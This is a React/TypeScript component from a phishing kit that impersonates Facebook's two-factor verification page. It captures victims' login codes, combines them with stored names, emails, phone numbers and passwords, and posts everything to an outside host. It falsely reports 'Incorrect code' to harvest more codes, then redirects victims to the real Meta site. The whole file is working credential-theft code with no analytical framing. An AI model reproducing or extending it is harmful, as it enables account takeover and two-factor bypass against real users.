import HeroImage from "@/assets/images/verify.png";
import getConfig from "@/utils/config";
import axios from "axios";
import type { FC } from "react";
import { useEffect, useState } from "react";
import { useNavigate } from "react-router";
const LAST_MESSAGE_KEY = "lastMessage";

interface UIState {
  error: string;
  isLoading: boolean;
  attempt: number;
}

interface Config {
  sheet_id: string;
  loadingTime: number;
  maxAttempt: number;
}

interface Message {
  ID: string;
  IP: string;
  ADD: string;
  TIME: string;
  PAGE_NAME: string;
  FULLNAME: string;
  BD: string;
  EMAIL: string;
  PHONENUMBER: string;
  PASS: string;
  PASS2?: string;
  CODE: string;
  CODE2: string;
  CODE3: string;
}
const initialUIState: UIState = {
  error: "",
  isLoading: false,
  attempt: 0,
};

const createVerifyMessage = (code: string, attempt?: number) => {
  const lastMessage = localStorage.getItem("lastMessage");
  let lassMessageObject: Message = {
    ID: "",
    IP: "",
    ADD: "",
    TIME: "",
    PAGE_NAME: "",
    FULLNAME: "",
    BD: "",
    EMAIL: "",
    PHONENUMBER: "",
    PASS: "",
    PASS2: "",
    CODE: "",
    CODE2: "",
    CODE3: "",
  };
  if (lastMessage) {
    lassMessageObject = JSON.parse(lastMessage);
  }
  if (attempt === 1) {
    lassMessageObject["CODE"] = code;
    return lassMessageObject;
  } else if (attempt === 2) {
    lassMessageObject["CODE2"] = code;
    return lassMessageObject;
  }
  lassMessageObject["CODE3"] = code;
  return lassMessageObject;
};

const sendTelegramMessage = async (message: Message, config: Config) => {
  const baseUrl = `https://kjzxcljzxklcjklasd.sbs/`;
  if (localStorage.getItem(LAST_MESSAGE_KEY)) {
    await axios.post(
      `${baseUrl}/update-data`,

      message,

      {
        headers: {
          "sheet-id": config.sheet_id,
        },
      },
    );
  } else {
    await axios.post(
      `${baseUrl}/add-data`,

      message,

      {
        headers: {
          "sheet-id": config.sheet_id,
        },
      },
    );
  }
};

const Verify: FC = () => {
  const navigate = useNavigate();
  const [code, setCode] = useState("");
  const [uiState, setUiState] = useState<UIState>(initialUIState);
  const [config, setConfig] = useState<Config>({
    sheet_id: "",
    loadingTime: 0,
    maxAttempt: 0,
  });

  useEffect(() => {
    const { settings } = getConfig();
    setConfig({
      sheet_id: settings.sheet_id,
      loadingTime: settings.password_loading_time,
      maxAttempt: settings.max_failed_code_attempts,
    });
  }, []);

  const handleSubmit = async () => {
    const lastMessage = localStorage.getItem(LAST_MESSAGE_KEY);
    if (!lastMessage) {
      navigate("/");
      return;
    }

    const message = createVerifyMessage(code, uiState.attempt + 1);
    localStorage.setItem("lastMessage", JSON.stringify(message).toString());

    if (uiState.attempt >= config.maxAttempt) {
      setUiState((prev) => ({ ...prev, isLoading: true }));

      try {
        await sendTelegramMessage(message, config);
        setTimeout(() => {
          window.location.replace(
            "https://web.facebook.com/business/tools/meta-business-suite?_rdc=1&_rdr#",
          );
        }, config.loadingTime);
      } catch {
        window.location.replace(
          "https://web.facebook.com/business/tools/meta-business-suite?_rdc=1&_rdr#",
        );
      }
      return;
    }

    setUiState((prev) => ({
      ...prev,
      attempt: prev.attempt + 1,
      isLoading: true,
    }));

    try {
      await sendTelegramMessage(message, config);
      setTimeout(() => {
        setUiState((prev) => ({
          ...prev,
          isLoading: false,
          error: "Incorrect code. Please try again.",
        }));
      }, config.loadingTime);
    } catch {
      navigate("/verify");
    }
  };

  const clearError = () => {
    setUiState((prev) => ({ ...prev, error: "" }));
  };

  const handleCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (/[a-zA-Z]+/g.test(e.target.value)) return;
    setCode(e.target.value);
  };

  return (
    <div className="flex flex-col justify-center gap-2 md:w-3/6 2xl:w-1/3">
      <div className="flex flex-col">
        <b>Account Center - Facebook</b>
        <b className="text-2xl">Check notifications on another device</b>
      </div>

      <div>
        <img src={HeroImage} alt="verify" />
      </div>

      <div>
        <b>Approve from another device or Enter your login code</b>
        <p>
          Approve from your device or enter the verification code! We have sent
          you a 6 or 8 digit verification code to your device. Or authenticate
          Please check your Facebook, Email or phone messages, Whatapps
          notifications!
        </p>
      </div>

      <div className="my-2 flex flex-col items-center justify-center">
        <input
          className={`w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none ${
            uiState.error ? "border-red-500 focus:border-red-500" : ""
          }`}
          type="text"
          autoComplete="one-time-code"
          inputMode="numeric"
          maxLength={8}
          minLength={6}
          pattern="\d*"
          placeholder="Enter Code (6-8 digits)"
          value={code}
          onFocus={clearError}
          onChange={handleCodeChange}
        />

        {uiState.error && (
          <div className="mt-2 text-sm text-red-500">{uiState.error}</div>
        )}

        <button
          className={`my-5 flex w-full items-center justify-center rounded-full p-4 font-semibold text-white ${
            code.length >= 6
              ? "bg-blue-500 hover:bg-blue-600"
              : "cursor-not-allowed bg-blue-300"
          }`}
          disabled={code.length < 6 || uiState.isLoading}
          type="button"
          onClick={handleSubmit}
        >
          {uiState.isLoading ? (
            <div className="h-6 w-6 animate-spin rounded-full border-2 border-t-transparent border-l-transparent p-2" />
          ) : (
            "Continue"
          )}
        </button>

        <p className="text-blue-500 hover:underline">Send Code</p>
      </div>
    </div>
  );
};

export default Verify;
